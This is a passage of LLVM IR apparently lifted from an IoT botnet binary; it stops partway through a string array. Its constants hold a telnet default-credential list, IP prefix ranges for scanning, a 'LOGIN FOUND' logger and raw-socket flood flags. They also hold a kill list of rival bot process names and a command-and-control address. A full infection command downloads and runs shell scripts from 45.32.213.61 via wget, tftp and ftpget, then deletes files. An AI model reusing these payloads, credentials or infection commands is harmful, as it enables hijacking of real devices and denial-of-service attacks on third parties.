source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_n = internal unnamed_addr global i1 false
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@cpsr_v = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_2800c.13 = global i32 0
@global_var_10d1c.17 = constant i32 -509558771
@global_var_2858c.20 = global i32 0
@global_var_28590.21 = local_unnamed_addr global i32 0
@global_var_28594.22 = local_unnamed_addr global i32 0
@global_var_282f0.25 = local_unnamed_addr global i32 4095
@global_var_282ec.28 = global i32 362436
@global_var_1daf4.30 = constant [7 x i8] c"(null)\00"
@global_var_2c58c.32 = local_unnamed_addr global i32 0
@global_var_1dafc.34 = constant [8 x i8] c"/bin/sh\00"
@global_var_1d6f8.36 = constant [3 x i8] c"sh\00"
@global_var_1db04.38 = constant [3 x i8] c"-c\00"
@global_var_1db08.41 = constant i32 -1
@global_var_1df08.43 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_1df18.45 = constant [9 x i8] c"BOGOMIPS\00"
@global_var_28570.50 = global i32 0
@global_var_1df24.52 = constant [5 x i8] c"PING\00"
@global_var_1dae4.54 = constant [8 x i8] c"busybox\00"
@global_var_1daec.55 = constant i32 36
@global_var_1daf0.56 = constant i32 35
@global_var_28270.57 = global [3 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1dae4.54, i32 0, i32 0), i8* bitcast (i32* @global_var_1daec.55 to i8*), i8* bitcast (i32* @global_var_1daf0.56 to i8*)]
@global_var_1daac.59 = constant [7 x i8] c"nvalid\00"
@global_var_1dab4.60 = constant [6 x i8] c"ailed\00"
@global_var_1dabc.61 = constant [9 x i8] c"ncorrect\00"
@global_var_1dac8.62 = constant [6 x i8] c"enied\00"
@global_var_1dad0.63 = constant [5 x i8] c"rror\00"
@global_var_1dad8.64 = constant [7 x i8] c"oodbye\00"
@global_var_1dae0.65 = constant [4 x i8] c"bad\00"
@global_var_28250.66 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1daac.59, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1dab4.60, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1dabc.61, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1dac8.62, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1dad0.63, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1dad8.64, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1dae0.65, i32 0, i32 0)]
@global_var_28578.68 = global i32 0
@global_var_2857c.69 = local_unnamed_addr global i32 0
@global_var_2e7d8.71 = global i32 0
@global_var_1df2c.73 = constant [6 x i8] c":>%$#\00"
@global_var_1df34.83 = constant [13 x i8] c"43.252.%d.%d\00"
@global_var_1df44.85 = constant [13 x i8] c"43.239.%d.%d\00"
@global_var_1df54.87 = constant [11 x i8] c"85.3.%d.%d\00"
@global_var_1df60.89 = constant [13 x i8] c"37.158.%d.%d\00"
@global_var_1df70.91 = constant [11 x i8] c"95.9.%d.%d\00"
@global_var_1df7c.93 = constant [13 x i8] c"41.252.%d.%d\00"
@global_var_1df8c.95 = constant [12 x i8] c"58.71.%d.%d\00"
@global_var_1df98.97 = constant [13 x i8] c"104.55.%d.%d\00"
@global_var_1dfa8.99 = constant [13 x i8] c"78.186.%d.%d\00"
@global_var_1dfb8.101 = constant [13 x i8] c"78.189.%d.%d\00"
@global_var_1dfc8.103 = constant [13 x i8] c"77.209.%d.%d\00"
@global_var_1dfd8.105 = constant [11 x i8] c"88.5.%d.%d\00"
@global_var_1dfe4.107 = constant [13 x i8] c"103.20.%d.%d\00"
@global_var_1dff4.109 = constant [13 x i8] c"103.47.%d.%d\00"
@global_var_1e004.111 = constant [13 x i8] c"103.57.%d.%d\00"
@global_var_1e014.113 = constant [13 x i8] c"45.117.%d.%d\00"
@global_var_1e024.115 = constant [13 x i8] c"101.51.%d.%d\00"
@global_var_1e034.117 = constant [13 x i8] c"137.59.%d.%d\00"
@global_var_1e044.119 = constant [11 x i8] c"1.56.%d.%d\00"
@global_var_1e050.121 = constant [12 x i8] c"1.188.%d.%d\00"
@global_var_1e05c.123 = constant [13 x i8] c"14.204.%d.%d\00"
@global_var_1e06c.125 = constant [11 x i8] c"27.0.%d.%d\00"
@global_var_1e078.127 = constant [11 x i8] c"27.8.%d.%d\00"
@global_var_1e084.129 = constant [12 x i8] c"27.50.%d.%d\00"
@global_var_1e090.131 = constant [12 x i8] c"27.54.%d.%d\00"
@global_var_1e09c.133 = constant [12 x i8] c"27.98.%d.%d\00"
@global_var_1e0a8.135 = constant [13 x i8] c"27.112.%d.%d\00"
@global_var_1e0b8.137 = constant [13 x i8] c"27.192.%d.%d\00"
@global_var_1e0c8.139 = constant [12 x i8] c"36.32.%d.%d\00"
@global_var_1e0d4.141 = constant [13 x i8] c"36.248.%d.%d\00"
@global_var_1e0e4.143 = constant [12 x i8] c"39.64.%d.%d\00"
@global_var_1e0f0.145 = constant [11 x i8] c"42.4.%d.%d\00"
@global_var_1e0fc.147 = constant [12 x i8] c"42.48.%d.%d\00"
@global_var_1e108.149 = constant [12 x i8] c"42.52.%d.%d\00"
@global_var_1e114.151 = constant [12 x i8] c"42.56.%d.%d\00"
@global_var_1e120.153 = constant [12 x i8] c"42.63.%d.%d\00"
@global_var_1e12c.155 = constant [12 x i8] c"42.84.%d.%d\00"
@global_var_1e138.157 = constant [13 x i8] c"42.176.%d.%d\00"
@global_var_1e148.159 = constant [13 x i8] c"42.224.%d.%d\00"
@global_var_1e158.161 = constant [11 x i8] c"60.0.%d.%d\00"
@global_var_1e164.163 = constant [12 x i8] c"60.16.%d.%d\00"
@global_var_1e170.165 = constant [13 x i8] c"163.53.%d.%d\00"
@global_var_1e180.167 = constant [12 x i8] c"62.30.%d.%d\00"
@global_var_1e18c.169 = constant [13 x i8] c"62.252.%d.%d\00"
@global_var_1e19c.171 = constant [13 x i8] c"62.254.%d.%d\00"
@global_var_1e1ac.173 = constant [13 x i8] c"62.255.%d.%d\00"
@global_var_1e1bc.175 = constant [12 x i8] c"77.96.%d.%d\00"
@global_var_1e1c8.177 = constant [12 x i8] c"77.97.%d.%d\00"
@global_var_1e1d4.179 = constant [12 x i8] c"77.98.%d.%d\00"
@global_var_1e1e0.181 = constant [13 x i8] c"77.100.%d.%d\00"
@global_var_1e1f0.183 = constant [13 x i8] c"77.102.%d.%d\00"
@global_var_1e200.185 = constant [14 x i8] c"113.191.%d.%d\00"
@global_var_1e210.187 = constant [13 x i8] c"81.100.%d.%d\00"
@global_var_1e220.189 = constant [14 x i8] c"113.188.%d.%d\00"
@global_var_1e230.191 = constant [14 x i8] c"113.189.%d.%d\00"
@global_var_1e240.193 = constant [13 x i8] c"94.174.%d.%d\00"
@global_var_1e250.195 = constant [13 x i8] c"14.160.%d.%d\00"
@global_var_1e260.197 = constant [13 x i8] c"14.161.%d.%d\00"
@global_var_1e270.199 = constant [13 x i8] c"14.162.%d.%d\00"
@global_var_1e280.201 = constant [13 x i8] c"14.163.%d.%d\00"
@global_var_1e290.203 = constant [13 x i8] c"14.164.%d.%d\00"
@global_var_1e2a0.205 = constant [13 x i8] c"14.165.%d.%d\00"
@global_var_1e2b0.207 = constant [13 x i8] c"14.166.%d.%d\00"
@global_var_1e2c0.209 = constant [13 x i8] c"14.167.%d.%d\00"
@global_var_1e2d0.211 = constant [13 x i8] c"14.168.%d.%d\00"
@global_var_1e2e0.213 = constant [13 x i8] c"14.169.%d.%d\00"
@global_var_1e2f0.215 = constant [13 x i8] c"14.170.%d.%d\00"
@global_var_1e300.217 = constant [13 x i8] c"14.171.%d.%d\00"
@global_var_1e310.219 = constant [13 x i8] c"14.172.%d.%d\00"
@global_var_1e320.222 = constant [13 x i8] c"14.173.%d.%d\00"
@global_var_1e330.224 = constant [13 x i8] c"14.174.%d.%d\00"
@global_var_1e340.226 = constant [13 x i8] c"14.175.%d.%d\00"
@global_var_1e350.228 = constant [13 x i8] c"14.176.%d.%d\00"
@global_var_1e360.230 = constant [13 x i8] c"14.177.%d.%d\00"
@global_var_1e370.232 = constant [13 x i8] c"14.178.%d.%d\00"
@global_var_1e380.234 = constant [13 x i8] c"14.179.%d.%d\00"
@global_var_1e390.236 = constant [13 x i8] c"14.180.%d.%d\00"
@global_var_1e3a0.238 = constant [13 x i8] c"14.181.%d.%d\00"
@global_var_1e3b0.240 = constant [13 x i8] c"14.182.%d.%d\00"
@global_var_1e3c0.242 = constant [13 x i8] c"14.183.%d.%d\00"
@global_var_1e3d0.244 = constant [13 x i8] c"14.184.%d.%d\00"
@global_var_1e3e0.246 = constant [13 x i8] c"14.185.%d.%d\00"
@global_var_1e3f0.248 = constant [13 x i8] c"14.186.%d.%d\00"
@global_var_1e400.250 = constant [13 x i8] c"14.187.%d.%d\00"
@global_var_1e410.252 = constant [13 x i8] c"14.188.%d.%d\00"
@global_var_1e420.254 = constant [13 x i8] c"14.189.%d.%d\00"
@global_var_1e430.256 = constant [13 x i8] c"14.190.%d.%d\00"
@global_var_1e440.258 = constant [13 x i8] c"14.191.%d.%d\00"
@global_var_1e450.260 = constant [13 x i8] c"45.121.%d.%d\00"
@global_var_1e460.262 = constant [13 x i8] c"45.120.%d.%d\00"
@global_var_1e470.264 = constant [13 x i8] c"45.115.%d.%d\00"
@global_var_1e480.266 = constant [13 x i8] c"43.230.%d.%d\00"
@global_var_1e490.268 = constant [13 x i8] c"43.240.%d.%d\00"
@global_var_1e4a0.270 = constant [13 x i8] c"43.245.%d.%d\00"
@global_var_1e4b0.272 = constant [13 x i8] c"41.174.%d.%d\00"
@global_var_1e4c0.274 = constant [13 x i8] c"49.118.%d.%d\00"
@global_var_1e4d0.276 = constant [13 x i8] c"78.188.%d.%d\00"
@global_var_1e4e0.278 = constant [13 x i8] c"45.127.%d.%d\00"
@global_var_1e4f0.280 = constant [13 x i8] c"103.30.%d.%d\00"
@global_var_1e500.282 = constant [12 x i8] c"14.33.%d.%d\00"
@global_var_1e50c.284 = constant [13 x i8] c"123.16.%d.%d\00"
@global_var_1e51c.286 = constant [13 x i8] c"202.44.%d.%d\00"
@global_var_1e52c.288 = constant [13 x i8] c"116.93.%d.%d\00"
@global_var_1e53c.290 = constant [12 x i8] c"91.83.%d.%d\00"
@global_var_1e548.292 = constant [13 x i8] c"41.253.%d.%d\00"
@global_var_1e558.294 = constant [14 x i8] c"117.173.%d.%d\00"
@global_var_1e568.296 = constant [14 x i8] c"113.190.%d.%d\00"
@global_var_1e578.298 = constant [13 x i8] c"146.88.%d.%d\00"
@global_var_1e588.300 = constant [14 x i8] c"112.196.%d.%d\00"
@global_var_1e598.302 = constant [14 x i8] c"113.178.%d.%d\00"
@global_var_1e5a8.304 = constant [13 x i8] c"112.45.%d.%d\00"
@global_var_1e5b8.306 = constant [14 x i8] c"183.223.%d.%d\00"
@global_var_282ac.308 = global i32 110
@global_var_1e5c8.312 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_2e7cc.314 = global i32 0
@global_var_1da30.316 = constant [15 x i8] c"/dev/netslink/\00"
@global_var_1da40.317 = constant [6 x i8] c"/tmp/\00"
@global_var_1da48.318 = constant [6 x i8] c"/var/\00"
@global_var_1da50.319 = constant [6 x i8] c"/dev/\00"
@global_var_1da58.320 = constant [10 x i8] c"/var/run/\00"
@global_var_1da64.321 = constant [10 x i8] c"/dev/shm/\00"
@global_var_1da70.322 = constant [6 x i8] c"/mnt/\00"
@global_var_1da78.323 = constant [7 x i8] c"/boot/\00"
@global_var_1da80.324 = constant [6 x i8] c"/usr/\00"
@global_var_1da88.325 = constant [6 x i8] c"/opt/\00"
@global_var_28210.326 = global [10 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1da30.316, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1da40.317, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1da48.318, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1da50.319, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1da58.320, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1da64.321, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1da70.322, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1da78.323, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1da80.324, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1da88.325, i32 0, i32 0)]
@global_var_2823c = external global i32
@global_var_1da1c.333 = constant [5 x i8] c"root\00"
@global_var_1da24.334 = constant [7 x i8] c"telnet\00"
@global_var_1da2c.335 = constant i32 0
@global_var_281f8.336 = global [6 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1da1c.333, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1da1c.333, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1da24.334, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1da1c.333, i32 0, i32 0), i8* bitcast (i32* @global_var_1da2c.335 to i8*), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1da24.334, i32 0, i32 0)]
@global_var_1e5d4.338 = constant [3 x i8] c"\0D\0A\00"
@global_var_28204.340 = global [3 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1da1c.333, i32 0, i32 0), i8* bitcast (i32* @global_var_1da2c.335 to i8*), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1da24.334, i32 0, i32 0)]
@global_var_28280.342 = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1daac.59, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1dab4.60, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1dabc.61, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1dac8.62, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1dad0.63, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1dad8.64, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1dae0.65, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1dae4.54, i32 0, i32 0), i8* bitcast (i32* @global_var_1daec.55 to i8*), i8* bitcast (i32* @global_var_1daf0.56 to i8*)]
@global_var_1e5d8.345 = constant [23 x i8] c"LOGIN FOUND - %s:%s:%s\00"
@global_var_1e5f0.347 = constant [5 x i8] c"sh\0D\0A\00"
@global_var_1e5f8.349 = constant [8 x i8] c"shell\0D\0A\00"
@global_var_1d824.351 = constant [504 x i8] c"cd /tmp || cd /var/system || cd /mnt || cd /lib;rm -f /tmp/* || /var/run/* || /var/system/* || /mnt/* || /lib/*;cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.32.213.61/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 45.32.213.61 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 45.32.213.61; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 45.32.213.61 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\0D\0A\00"
@global_var_281f4.352 = local_unnamed_addr global [504 x i8]* @global_var_1d824.351
@global_var_1e600.354 = constant [6 x i8] c"arfgG\00"
@global_var_1e608.355 = constant [9 x i8] c"HBiug655\00"
@global_var_1e614.356 = constant [13 x i8] c"KJYDFyljf754\00"
@global_var_1e624.357 = constant [20 x i8] c"LIKUGilkut769458905\00"
@global_var_1e638.358 = constant [17 x i8] c"JHFDSkgfc5747694\00"
@global_var_1e64c.359 = constant [12 x i8] c"GJjyur67458\00"
@global_var_1e658.360 = constant [12 x i8] c"RYSDk747586\00"
@global_var_1e664.361 = constant [12 x i8] c"HKJGi5r8675\00"
@global_var_1e670.362 = constant [10 x i8] c"KHGK7985i\00"
@global_var_1e67c.363 = constant [11 x i8] c"yuituiILYF\00"
@global_var_1e688.364 = constant [14 x i8] c"GKJDghfcjkgd4\00"
@global_var_1e698.365 = constant [12 x i8] c"uygtfgtrevf\00"
@global_var_1e6a4.366 = constant [13 x i8] c"tyeuhygbtfvg\00"
@global_var_1e6b4.367 = constant [9 x i8] c"ewqdcftr\00"
@global_var_1e6c0.368 = constant [16 x i8] c"trbazetghhnbrty\00"
@global_var_1e6d0.369 = constant [11 x i8] c"tbhrwsehbg\00"
@global_var_1e6dc.370 = constant [12 x i8] c"twehgbferhb\00"
@global_var_1e6e8.371 = constant [12 x i8] c"etrbhhgetrb\00"
@global_var_1e6f4.372 = constant [14 x i8] c"edfverthbyrtb\00"
@global_var_1e704.373 = constant [14 x i8] c"kmiujmnhnhfgn\00"
@global_var_1e714.374 = constant [14 x i8] c"zcdbvgdfsbgfd\00"
@global_var_1e724.375 = constant [10 x i8] c"gdfbtsdgb\00"
@global_var_1e730.376 = constant [14 x i8] c"ghdugffytsdyt\00"
@global_var_1e740.377 = constant [14 x i8] c"tgerthgwtrwry\00"
@global_var_1e750.378 = constant [12 x i8] c"yteytietyue\00"
@global_var_1e75c.379 = constant [9 x i8] c"qsortEQS\00"
@global_var_1e768.380 = constant [16 x i8] c"8969876hjkghblk\00"
@global_var_1e778.381 = constant [4 x i8] c"std\00"
@global_var_1e77c.382 = constant [4 x i8] c"dts\00"
@global_var_1e780.383 = constant [4 x i8] c"lsk\00"
@global_var_1e784.384 = constant [4 x i8] c"kek\00"
@global_var_1e788.385 = constant [6 x i8] c"smack\00"
@global_var_1e790.386 = constant [4 x i8] c"ily\00"
@global_var_1e794.387 = constant [4 x i8] c"tyf\00"
@global_var_1e798.388 = constant [4 x i8] c"pos\00"
@global_var_1e79c.389 = constant [6 x i8] c"cunts\00"
@global_var_1e7a4.390 = constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1e600.354, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1e608.355, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1e614.356, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_1e624.357, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_1e638.358, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1e64c.359, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1e658.360, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1e664.361, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1e670.362, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1e67c.363, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1e688.364, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1e698.365, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1e6a4.366, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1e6b4.367, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1e6c0.368, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1e6d0.369, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1e6dc.370, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1e6e8.371, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1e6f4.372, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1e704.373, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1e714.374, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1e724.375, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1e730.376, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1e740.377, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1e750.378, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1e75c.379, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1e768.380, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1e778.381, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1e77c.382, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1e780.383, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1e784.384, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1e788.385, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1e790.386, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1e794.387, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1e798.388, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1e79c.389, i32 0, i32 0)]
@global_var_1e834.394 = constant [27 x i8] c"Failed opening raw socket.\00"
@global_var_1e850.396 = constant [33 x i8] c"Failed setting raw headers mode.\00"
@global_var_1e874.401 = constant [4 x i8] c"all\00"
@global_var_1e878.403 = constant i32 44
@global_var_1e87c.405 = constant [4 x i8] c"syn\00"
@global_var_1e880.407 = constant [4 x i8] c"rst\00"
@global_var_f000.408 = constant i32 125060
@global_var_1e884.409 = constant [4 x i8] c"fin\00"
@global_var_1e888.411 = constant [4 x i8] c"ack\00"
@global_var_1e88c.413 = constant [4 x i8] c"psh\00"
@global_var_1e890.415 = constant [18 x i8] c"Invalid flag \22%s\22\00"
@global_var_1e8a4.417 = constant [10 x i8] c"pkill -9 \00"
@global_var_1d5b8.419 = constant [5 x i8] c"mips\00"
@global_var_1d5c0.420 = constant [7 x i8] c"mipsel\00"
@global_var_1d5c8.421 = constant [4 x i8] c"sh4\00"
@global_var_1d5cc.422 = constant [4 x i8] c"x86\00"
@global_var_1d5d0.423 = constant [5 x i8] c"i686\00"
@global_var_1d5d8.424 = constant [4 x i8] c"ppc\00"
@global_var_1d5dc.425 = constant [5 x i8] c"i586\00"
@global_var_1d5e4.426 = constant [8 x i8] c"jackmy*\00"
@global_var_1d5ec.427 = constant [8 x i8] c"hackmy*\00"
@global_var_1d5f4.428 = constant [5 x i8] c"arm*\00"
@global_var_1d5fc.429 = constant [3 x i8] c"b1\00"
@global_var_1d600.430 = constant [3 x i8] c"b2\00"
@global_var_1d604.431 = constant [3 x i8] c"b3\00"
@global_var_1d608.432 = constant [3 x i8] c"b4\00"
@global_var_1d60c.433 = constant [3 x i8] c"b5\00"
@global_var_1d610.434 = constant [3 x i8] c"b6\00"
@global_var_1d614.435 = constant [3 x i8] c"b7\00"
@global_var_1d618.436 = constant [3 x i8] c"b8\00"
@global_var_1d61c.437 = constant [3 x i8] c"b9\00"
@global_var_1d620.438 = constant [17 x i8] c"busyboxterrorist\00"
@global_var_1d634.439 = constant [9 x i8] c"DFhxdhdf\00"
@global_var_1d640.440 = constant [10 x i8] c"dvrHelper\00"
@global_var_1d64c.441 = constant [8 x i8] c"FDFDHFC\00"
@global_var_1d654.442 = constant [5 x i8] c"FEUB\00"
@global_var_1d65c.443 = constant [9 x i8] c"FTUdftui\00"
@global_var_1d668.444 = constant [9 x i8] c"GHfjfgvj\00"
@global_var_1d674.445 = constant [6 x i8] c"jhUOH\00"
@global_var_1d67c.446 = constant [9 x i8] c"JIPJIPJj\00"
@global_var_1d688.447 = constant [10 x i8] c"JIPJuipjh\00"
@global_var_1d694.448 = constant [10 x i8] c"kmyx86_64\00"
@global_var_1d6a0.449 = constant [10 x i8] c"lolmipsel\00"
@global_var_1d6ac.450 = constant [8 x i8] c"RYrydry\00"
@global_var_1d6b4.451 = constant [5 x i8] c"tel*\00"
@global_var_1d6bc.452 = constant [9 x i8] c"TwoFace*\00"
@global_var_1d6c8.453 = constant [9 x i8] c"UYyuyioy\00"
@global_var_1d6d4.454 = constant [5 x i8] c"wget\00"
@global_var_1d6dc.455 = constant [7 x i8] c"x86_64\00"
@global_var_1d6e4.456 = constant [9 x i8] c"XDzdfxzf\00"
@global_var_1d6f0.457 = constant [5 x i8] c"xxb*\00"
@global_var_1d6fc.458 = constant i32 49
@global_var_1d700.459 = constant i32 50
@global_var_1d704.460 = constant i32 51
@global_var_1d708.461 = constant i32 52
@global_var_1d70c.462 = constant i32 53
@global_var_1d710.463 = constant i32 54
@global_var_1d714.464 = constant i32 55
@global_var_1d718.465 = constant i32 56
@global_var_1d71c.466 = constant i32 57
@global_var_1d720.467 = constant [3 x i8] c"10\00"
@global_var_1d724.468 = constant [3 x i8] c"11\00"
@global_var_1d728.469 = constant [3 x i8] c"12\00"
@global_var_1d72c.470 = constant [3 x i8] c"13\00"
@global_var_1d730.471 = constant [3 x i8] c"14\00"
@global_var_1d734.472 = constant [3 x i8] c"15\00"
@global_var_1d738.473 = constant [3 x i8] c"16\00"
@global_var_1d73c.474 = constant [3 x i8] c"17\00"
@global_var_1d740.475 = constant [3 x i8] c"18\00"
@global_var_1d744.476 = constant [3 x i8] c"19\00"
@global_var_1d748.477 = constant [3 x i8] c"20\00"
@global_var_1d74c.478 = constant [6 x i8] c"hackz\00"
@global_var_1d754.479 = constant [5 x i8] c"bin*\00"
@global_var_1d75c.480 = constant [5 x i8] c"gtop\00"
@global_var_1d764.481 = constant [5 x i8] c"ftp*\00"
@global_var_1d76c.482 = constant [6 x i8] c"tftp*\00"
@global_var_1d774.483 = constant [7 x i8] c"botnet\00"
@global_var_1d77c.484 = constant [8 x i8] c"swatnet\00"
@global_var_1d784.485 = constant [8 x i8] c"ballpit\00"
@global_var_1d78c.486 = constant [8 x i8] c"fucknet\00"
@global_var_1d794.487 = constant [9 x i8] c"cracknet\00"
@global_var_1d7a0.488 = constant [8 x i8] c"weednet\00"
@global_var_1d7a8.489 = constant [7 x i8] c"gaynet\00"
@global_var_1d7b0.490 = constant [9 x i8] c"queernet\00"
@global_var_1d7bc.491 = constant [8 x i8] c"ballnet\00"
@global_var_1d7c4.492 = constant [5 x i8] c"unet\00"
@global_var_1d7cc.493 = constant [7 x i8] c"yougay\00"
@global_var_1d7d4.494 = constant [7 x i8] c"sttftp\00"
@global_var_1d7dc.495 = constant [7 x i8] c"sstftp\00"
@global_var_1d7e4.496 = constant [7 x i8] c"sbtftp\00"
@global_var_1d7ec.497 = constant [6 x i8] c"btftp\00"
@global_var_1d7f4.498 = constant [9 x i8] c"y0u1sg3y\00"
@global_var_1d800.499 = constant [6 x i8] c"bruv*\00"
@global_var_1d808.500 = constant [5 x i8] c"IoT*\00"
@global_var_1d810.501 = constant [18 x i8] c"185.158.113.30:77\00"
@global_var_28094.502 = global [87 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1d5b8.419, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1d5c0.420, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1d5c8.421, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1d5cc.422, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1d5d0.423, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1d5d8.424, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1d5dc.425, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1d5dc.425, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1d5e4.426, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1d5ec.427, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1d5f4.428, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1d5fc.429, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1d600.430, i32 0, i32 0), i8* getelementptr 